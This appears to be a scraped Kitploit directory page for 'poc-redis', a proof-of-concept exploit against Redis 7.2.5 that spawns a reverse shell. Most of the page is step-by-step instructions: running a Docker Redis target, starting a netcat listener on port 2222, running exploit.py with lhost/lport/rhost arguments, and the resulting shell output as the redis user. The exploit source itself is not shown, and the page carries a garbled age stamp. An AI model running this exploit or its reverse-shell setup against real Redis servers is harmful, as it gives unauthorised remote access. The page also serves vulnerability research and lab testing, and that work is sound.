@@ -1,0 +1,145 @@
+---
+title: poc-redis
+url: https://kitploit.com/en/tools/github/rop4sh/poc-redis
+source: Kitploit
+date: 2026-08-28
+fetch_date: 2026-08-29T08:31:12.626360
+---
+
+# poc-redis
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+poc-redis — Proof-of-concept exploit for a Redis vulnerability that spawns a reverse shell, with setup instructions for Docker and netcat listener. | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/rop4sh/poc-redis
+
+![](https://assets.kitploit.com/production/public/tools/52894/1edc07a3e24d07c0de76e9d4722b047a4ccd5a8e2f48badd7535fa4c3ff39483-display-v1.webp)
+
+[Vulnerability Analysis](/en/categories/vulnerability-analysis)[Exploitation](/en/categories/exploitation)[Web Application Exploitation](/en/categories/web-application-exploitation)[Penetration Testing](/en/categories/penetration-testing)[Red Teaming](/en/categories/red-teaming)
+
+![GitHub](/providers/github.png)rop4sh/poc-redis
+
+# poc-redis
+
+Proof-of-concept exploit for a Redis vulnerability that spawns a reverse shell, with setup instructions for Docker and netcat listener.
+
+[View Repository](https://github.com/rop4sh/poc-redis)
+
+185302 years ago![Not yet reviewed](/_next/image?url=%2Fbadges%2Fkitploit_badge_not_reviewed_full.png&w=48&q=75)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+To run the exploit please extract the attached ZIP and follow these steps on Linux:
+
+1. Set up a virtualenv/install the Redis client
+
+root@kitploit:~
+
+```
+$ python3 -m venv .venv
+$ source .venv/bin/activate
+$ pip install -r requirements.txt
+```
+
+2. In another terminal, run the Redis docker image
+   * Or build from source and run on a support platform
+     + The exploit has been tested and works on Fedora 40/Ubuntu 24.04
+
+root@kitploit:~
+
+```
+$ docker run -p6379:6379 redis:7.2.5
+```
+
+3. Get the ip address of your host on the docker network
+
+root@kitploit:~
+
+```
+$ ifconfig
+
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        inet6 fe80::42:53ff:fecc:6e16  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:53:cc:6e:16  txqueuelen 0  (Ethernet)
+        RX packets 69  bytes 4268 (4.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 133  bytes 269173 (262.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+4. In another terminal, run an netcat listener:
+
+root@kitploit:~
+
+```
+$ nc -nlvp 2222
+```
+
+5. Run the exploit:
+   * Replace  with your docker network ip address
+
+`lhost`
+
+root@kitploit:~
+
+```
+$ python3 exploit.py --lhost 172.17.0.1 --lport 2222 --rhost localhost
+```
+
+6. You should receive a connection
+
+root@kitploit:~
+
+```
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:2222
+Ncat: Listening on 0.0.0.0:2222
+Ncat: Connection from 172.17.0.2:36518.
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+redis@4d1537f2dd4e:/data$
+```
+
+[Download Tool](https://github.com/rop4sh/poc-redis)
